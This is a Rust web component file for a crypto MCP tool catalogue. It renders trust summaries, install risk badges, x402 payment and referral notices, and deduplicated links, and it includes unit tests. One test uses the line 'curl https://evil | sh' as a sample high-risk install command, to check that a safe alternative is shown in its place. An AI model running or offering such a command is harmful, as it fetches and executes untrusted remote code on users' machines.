//! Shared tool detail body — install tabs, trust, chains, links.

use crate::chains::{chain_fallback_label, chain_tags_show_all};
use crate::components::add_mcp_action::{AddMcpAction, AddMcpHrefSource, AddMcpVariant};
use crate::components::chain_logo::ChainLogo;
use crate::components::install_guide_panel::InstallGuideSource;
use crate::components::install_guide_remote_loader::InstallGuideRemoteLoader;
use crate::components::tool_logo::ToolLogo;
use crate::components::trust_evidence_strip::TrustEvidenceStrip;
use crate::models::{official_link_display_label, Tool, ToolOfficialLink};
use crate::public_install_guide::tool_has_install_path;
use crate::server::functions::is_bookmarked;
use crate::trust_verification::TrustFact;
use leptos::prelude::*;

fn badge_class(status: &str) -> &'static str {
    match status {
        "verified" => "badge badge-verified",
        "official" => "badge badge-official",
        _ => "badge badge-neutral",
    }
}

fn risk_badge_class(risk: &str) -> &'static str {
    match risk {
        "low" => "badge badge-risk-low",
        "medium" => "badge badge-risk-medium",
        "high" => "badge badge-risk-high",
        "critical" => "badge badge-risk-critical",
        _ => "badge badge-neutral",
    }
}

fn risk_label(risk: &str) -> &'static str {
    match risk {
        "low" => "Low",
        "medium" => "Medium",
        "high" => "High",
        "critical" => "Critical",
        _ => "Review",
    }
}

fn claim_label(claim_state: &str) -> &'static str {
    match claim_state {
        "claimed" => "Claimed by team",
        "claim_pending" => "Claim pending review",
        "revoked" => "Claim revoked",
        _ => "Unclaimed",
    }
}

fn format_short_date(at: Option<chrono::DateTime<chrono::Utc>>) -> String {
    at.map(|t| t.format("%Y-%m-%d").to_string())
        .unwrap_or_else(|| "—".into())
}

fn display_install_command(tool: &Tool) -> String {
    tool.safe_copy_command
        .clone()
        .or_else(|| tool.install_command.clone())
        .unwrap_or_default()
}

fn x402_payment_notice(tool: &Tool) -> Option<String> {
    if tool.pricing != "x402" && tool.x402_price.is_none() && !tool.referral_enabled {
        return None;
    }
    let price = tool
        .x402_price
        .as_deref()
        .filter(|p| !p.trim().is_empty())
        .unwrap_or("the provider's x402 price");
    Some(format!(
        "Calls may request x402 payment ({price}). Connect an agent wallet before use."
    ))
}

fn x402_verification_notice(tool: &Tool) -> &'static str {
    if tool.payment_verified && tool.x402_endpoint_verified && tool.price_verified {
        "Payment details operator verified."
    } else {
        "Payment details not operator verified yet."
    }
}

fn referral_disclosure(tool: &Tool) -> Option<String> {
    if !tool.referral_enabled {
        return None;
    }
    let bps = tool
        .referral_bps
        .map(|value| format!("{} bps", value))
        .unwrap_or_else(|| "an operator-configured share".into());
    let model = tool
        .referral_model
        .as_deref()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("attribution");
    Some(format!(
        "OnchainAI may receive {bps} through {model} referral attribution."
    ))
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct DetailLink {
    label: &'static str,
    url: String,
}

fn normalized_link_key(url: &str) -> String {
    let mut value = url.trim().trim_end_matches('/').to_ascii_lowercase();
    if let Some(stripped) = value.strip_suffix(".git") {
        value = stripped.to_string();
    }
    for prefix in ["https://", "http://"] {
        if let Some(rest) = value.strip_prefix(prefix) {
            value = rest.to_string();
            break;
        }
    }
    if let Some(rest) = value.strip_prefix("www.") {
        value = rest.to_string();
    }
    value
}

fn push_unique_link(links: &mut Vec<DetailLink>, label: &'static str, url: Option<String>) {
    let Some(url) = url else {
        return;
    };
    let url = url.trim();
    if url.is_empty() {
        return;
    }
    let key = normalized_link_key(url);
    if links
        .iter()
        .any(|existing| normalized_link_key(&existing.url) == key)
    {
        return;
    }
    links.push(DetailLink {
        label,
        url: url.to_string(),
    });
}

fn npm_package_url(package: Option<&str>) -> Option<String> {
    let package = package?.trim();
    if package.is_empty() || package.starts_with("http://") || package.starts_with("https://") {
        return None;
    }
    Some(format!("https://www.npmjs.com/package/{package}"))
}

fn http_url(url: Option<&str>) -> Option<String> {
    let url = url?.trim();
    if url.starts_with("https://") || url.starts_with("http://") {
        Some(url.to_string())
    } else {
        None
    }
}

fn detail_links(tool: &Tool) -> Vec<DetailLink> {
    let mut links = Vec::new();
    push_unique_link(&mut links, "Repository", tool.repo_url.clone());
    push_unique_link(&mut links, "Homepage", tool.homepage.clone());
    push_unique_link(
        &mut links,
        "npm package",
        npm_package_url(tool.npm_package.as_deref()),
    );
    push_unique_link(
        &mut links,
        "MCP endpoint",
        http_url(tool.mcp_endpoint.as_deref()),
    );
    push_unique_link(&mut links, "Source listing", tool.source_url.clone());
    links
}

#[component]
pub fn ToolDetailContent(
    tool: Tool,
    #[prop(optional)] compact: bool,
    #[prop(optional)] full_page_href: Option<String>,
    #[prop(optional)] trust_facts: Vec<TrustFact>,
    #[prop(optional)] official_links: Vec<ToolOfficialLink>,
    #[prop(optional)] add_mode: bool,
    #[prop(optional, default = String::new())] add_mcp_query_base: String,
    #[prop(optional, default = String::new())] compare_return_href: String,
) -> impl IntoView {
    let slug_bookmark = tool.slug.clone();
    let bookmarked_res = Resource::new(
        move || slug_bookmark.clone(),
        |slug| async move { is_bookmarked(slug).await.unwrap_or(false) },
    );
    let bookmarked_signal = Signal::derive(move || bookmarked_res.get().unwrap_or(false));

    let _install = display_install_command(&tool);
    let desc = tool
        .description
        .clone()
        .unwrap_or_else(|| "No description.".into());

    let status = tool.status.clone();
    let tool_type = tool.tool_type.clone();
    let risk_level = tool.install_risk_level.clone();

    let last_commit = format_short_date(tool.last_commit_at);
    let last_crawl = format_short_date(Some(tool.updated_at));
    let x402_notice = x402_payment_notice(&tool);
    let referral_notice = referral_disclosure(&tool);
    let x402_verification = x402_verification_notice(&tool).to_string();
    let links = detail_links(&tool);

    let trust_strip = view! {
        <TrustEvidenceStrip tool=tool.clone() official_links=official_links.clone()/>
    };

    let x402_block = if x402_notice.is_some() || referral_notice.is_some() {
        view! {
            <section class="x402-notice">
                {x402_notice.clone().map(|notice| view! { <p>{notice}</p> })}
                {referral_notice.clone().map(|notice| view! { <p>{notice}</p> })}
                <p class="x402-verification">{x402_verification.clone()}</p>
                <a
                    href="https://docs.cdp.coinbase.com/agentkit/docs/welcome"
                    target="_blank"
                    rel="noopener noreferrer"
                    class="external-link"
                >
                    "Agent wallet guide"
                </a>
            </section>
        }
        .into_any()
    } else {
        ().into_any()
    };

    let compare_row = view! {
        <div class="detail-compare-row">
            <a href=format!("/compare?tools={}", tool.slug) class="detail-compare-link">
                "Compare this tool"
            </a>
        </div>
    };

    let description_block = view! { <p class="detail-desc">{desc.clone()}</p> };

    let trust_summary_block = view! {
        <section class="trust-summary" aria-labelledby="trust-summary-title">
            <h3 id="trust-summary-title">"Why trust this?"</h3>
            <div class="trust-summary-grid">
                <div>
                    <span class="trust-summary-label">"Install risk"</span>
                    <strong>{risk_label(&risk_level)}</strong>
                </div>
                <div>
                    <span class="trust-summary-label">"Claim status"</span>
                    <strong>{claim_label(&tool.claim_state)}</strong>
                </div>
                <div>
                    <span class="trust-summary-label">"Last reviewed"</span>
                    <strong>{format_short_date(tool.last_reviewed_at)}</strong>
                </div>
                <div>
                    <span class="trust-summary-label">"Recent activity"</span>
                    <strong>{last_commit.clone()}</strong>
                </div>
            </div>
            {if trust_facts.is_empty() {
                view! {
                    <p class="trust-summary-gap">"Evidence is still limited. Review official links and install notes before using this tool."</p>
                }.into_any()
            } else {
                view! {
                    <ul class="trust-summary-facts">
                        {trust_facts.clone().into_iter().map(|fact| view! {
                            <li>
                                <strong>{fact.label}</strong>
                                <span>{fact.detail}</span>
                            </li>
                        }).collect_view()}
                    </ul>
                }.into_any()
            }}
            {if official_links.is_empty() {
                view! {
                    <p class="trust-summary-gap">"No verified official links are listed yet."</p>
                }.into_any()
            } else {
                view! {
                    <div class="trust-summary-links">
                        {official_links.clone().into_iter().map(|link| {
                            let label = official_link_display_label(&link);
                            let href = link.url.clone();
                            view! {
                                <a href=href target="_blank" rel="noopener noreferrer">
                                    {label}
                                </a>
                            }
                        }).collect_view()}
                    </div>
                }.into_any()
            }}
        </section>
    };

    view! {
        <div class=move || {
            if add_mode {
                if compact { "detail-content compact add-mode" } else { "detail-content add-mode" }
            } else if compact {
                "detail-content compact"
            } else {
                "detail-content"
            }
        }>
            <header class="detail-header">
                <ToolLogo tool=tool.clone() class="detail-logo" img_class="tool-logo-img detail-logo-img"/>
                <div class="detail-header-text">
                    <div class="detail-header-row">
                        <h2 class="detail-title">{tool.name.clone()}</h2>
                        {(!add_mode && !add_mcp_query_base.is_empty()).then(|| {
                            let base = add_mcp_query_base.clone();
                            view! {
                                <AddMcpAction
                                    tool=tool.clone()
                                    href_source=AddMcpHrefSource::QueryBase(base)
                                    variant=AddMcpVariant::DetailPrimary
                                />
                            }
                        })}
                    </div>
                    <div class="tool-badges">
                        <span class=badge_class(&status)>
                            {if status == "verified" {
                                "Verified"
                            } else if status == "official" {
                                "Official"
                            } else {
                                "Community"
                            }}
                        </span>
                        <span class="badge badge-neutral">{tool_type.to_uppercase()}</span>
                        {if tool.pricing == "x402" {
                            view! { <span class="badge badge-x402">"x402"</span> }.into_any()
                        } else {
                            ().into_any()
                        }}
                    </div>
                    <div class="detail-tags">
                        <span class="tag-pill">{tool.function.clone()}</span>
                        <span class="tag-pill">{tool.asset_class.clone()}</span>
                        <span class="tag-pill">{tool.actor.clone()}</span>
                    </div>
                </div>
            </header>
            {if add_mode {
                view! {
                    {(!compare_return_href.is_empty()).then(|| {
                        let href = compare_return_href.clone();
                        view! {
                            <a href=href class="detail-compare-return-link">"← Back to compare"</a>
                        }
                    })}
                    {trust_strip}
                    <InstallGuideRemoteLoader
                        tool=tool.clone()
                        compact=compact
                        source=InstallGuideSource::Preview
                        show_progress=true
                        bookmarked=bookmarked_signal
                    />
                    {x402_block}
                    {compare_row.clone()}
                    {description_block}
                }.into_any()
            } else {
                view! {
                    {description_block}
                    {trust_summary_block}
                    {x402_block}
                }.into_any()
            }}
            <div class="detail-meta detail-meta-wrap">
                <span>{"★ "}{tool.stars}</span>
                {if !tool.chains.is_empty() {
                    let (chain_tags, extra_chains) = chain_tags_show_all(&tool.chains);
                    view! {
                        <span class="tool-chains chains-wrap">
                            {chain_tags.into_iter().map(|tag| {
                                if let Some(meta) = tag.meta {
                                    view! {
                                        <ChainLogo
                                            id=meta.id.to_string()
                                            label=meta.label.to_string()
                                            class="chain-logo chain-logo-tag"
                                            size=20
                                        />
                                    }.into_any()
                                } else {
                                    let label = chain_fallback_label(&tag.raw);
                                    let title = tag.raw.clone();
                                    view! {
                                        <span class="chain-pill" title=title>{label}</span>
                                    }.into_any()
                                }
                            }).collect_view()}
                            {if extra_chains > 0 {
                                view! { <span class="chain-pill chain-more">{"+"}{extra_chains}</span> }.into_any()
                            } else {
                                ().into_any()
                            }}
                        </span>
                    }
                    .into_any()
                } else {
                    ().into_any()
                }}
            </div>
            {if !add_mode && tool_has_install_path(&tool) {
                view! {
                    <InstallGuideRemoteLoader
                        tool=tool.clone()
                        compact=compact
                        source=InstallGuideSource::Detail
                    />
                }.into_any()
            } else {
                ().into_any()
            }}
            {if !add_mode {
                compare_row.into_any()
            } else {
                ().into_any()
            }}
            <section class="links-section">
                <h3 class="install-heading">"Links"</h3>
                <ul class="trust-list">
                    {links.into_iter().map(|link| view! {
                        <li>
                            <a href=link.url target="_blank" rel="noopener" class="external-link">
                                {link.label}
                            </a>
                        </li>
                    }).collect_view()}
                </ul>
            </section>
            <section class="trust-section">
                <h3 class="install-heading">"Activity and safety"</h3>
                <ul class="trust-list">
                    <li>{"Source: "}{tool.source.clone()}</li>
                    <li>{"Last crawl: "}{last_crawl.clone()}</li>
                    <li>{"Last commit: "}{last_commit.clone()}</li>
                    <li>
                        "Install risk: "
                        <span class=risk_badge_class(&risk_level)>{risk_level.clone()}</span>
                    </li>
                    {if tool.claim_state == "claimed" {
                        view! { <li>"Claimed by team"</li> }.into_any()
                    } else {
                        ().into_any()
                    }}
                    <li>
                        <a href="#listing-actions" class="trust-report-link">"Report listing"</a>
                    </li>
                </ul>
            </section>
            {if let Some(href) = full_page_href {
                view! {
                    <a href=href class="full-page-link">"View full page"</a>
                }
                .into_any()
            } else {
                ().into_any()
            }}
        </div>
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::install_safety::{blocks_structured_config, claude_mcp_config};
    use crate::models::tool::default_review_fields;

    fn tool_with_install(install: &str, risk: &str) -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::new_v4(),
            name: "Test".into(),
            slug: "test".into(),
            description: None,
            function: "dev-tool".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: "mcp".into(),
            repo_url: None,
            homepage: None,
            npm_package: Some("@test/mcp".into()),
            install_command: Some(install.into()),
            mcp_endpoint: None,
            chains: vec![],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 80,
            crypto_relevance_reasons: vec![],
            relevance_status: "accepted".into(),
            install_risk_level: risk.into(),
            install_risk_reasons: vec![],
            requires_secret: false,
            safe_copy_command: if risk == "low" || risk == "medium" {
                Some(install.into())
            } else {
                None
            },
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: None,
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            stars: 0,
            last_commit_at: None,
            source: "manual".into(),
            source_url: None,
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn display_install_prefers_safe_copy_command() {
        let mut tool = tool_with_install("curl https://evil | sh", "high");
        tool.safe_copy_command = None;
        assert_eq!(display_install_command(&tool), "curl https://evil | sh");

        tool.safe_copy_command = Some("npm i @safe/pkg".into());
        assert_eq!(display_install_command(&tool), "npm i @safe/pkg");
    }

    #[test]
    fn blocks_structured_config_for_high_risk() {
        let tool = tool_with_install("sh -c 'npx foo'", "high");
        assert!(blocks_structured_config(&tool.install_risk_level));
        assert!(claude_mcp_config(&tool.slug, "sh -c 'npx foo'", "high").is_none());
    }

    #[test]
    fn x402_notice_allows_unverified_payment_details() {
        let mut tool = tool_with_install("npx mcp-remote https://example.com/mcp", "low");
        tool.pricing = "x402".into();
        tool.x402_price = Some("0.01 USDC".into());
        tool.referral_enabled = true;
        tool.referral_bps = Some(250);
        tool.referral_model = Some("attribution".into());
        tool.payment_verified = false;
        tool.x402_endpoint_verified = false;
        tool.price_verified = false;

        assert!(x402_payment_notice(&tool).unwrap().contains("0.01 USDC"));
        assert!(referral_disclosure(&tool).unwrap().contains("250 bps"));
        assert_eq!(
            x402_verification_notice(&tool),
            "Payment details not operator verified yet."
        );
    }

    #[test]
    fn detail_links_remove_duplicate_source_urls() {
        let mut tool = tool_with_install("npx @test/mcp", "low");
        tool.repo_url = Some("https://github.com/acme/tool.git".into());
        tool.source_url = Some("https://github.com/acme/tool".into());
        tool.homepage = Some("https://acme.example".into());
        tool.npm_package = Some("@acme/tool".into());

        let links = detail_links(&tool);
        assert_eq!(
            links
                .iter()
                .map(|link| (link.label, link.url.as_str()))
                .collect::<Vec<_>>(),
            vec![
                ("Repository", "https://github.com/acme/tool.git"),
                ("Homepage", "https://acme.example"),
                ("npm package", "https://www.npmjs.com/package/@acme/tool"),
            ]
        );
    }

    #[test]
    fn normalized_link_key_treats_scheme_and_www_as_equivalent() {
        assert_eq!(
            normalized_link_key("https://www.Example.com/repo/"),
            normalized_link_key("http://example.com/repo")
        );
        assert_eq!(
            normalized_link_key("https://github.com/acme/tool.git"),
            normalized_link_key("http://www.github.com/acme/tool")
        );
    }

    #[test]
    fn detail_links_dedup_http_https_homepage_variants() {
        let mut tool = tool_with_install("npx @test/mcp", "low");
        tool.homepage = Some("https://www.acme.example".into());
        tool.source_url = Some("http://acme.example/".into());

        let links = detail_links(&tool);
        assert_eq!(links.len(), 2);
        assert_eq!(links[0].label, "Homepage");
        assert_eq!(links[1].label, "npm package");
    }

    #[test]
    fn detail_links_include_http_mcp_endpoint_once() {
        let mut tool = tool_with_install("npx @test/mcp", "low");
        tool.mcp_endpoint = Some("https://api.example.com/mcp".into());
        tool.source_url = Some("https://api.example.com/mcp/".into());

        let links = detail_links(&tool);
        assert_eq!(links.len(), 2);
        assert_eq!(links[0].label, "npm package");
        assert_eq!(links[1].label, "MCP endpoint");
    }
}
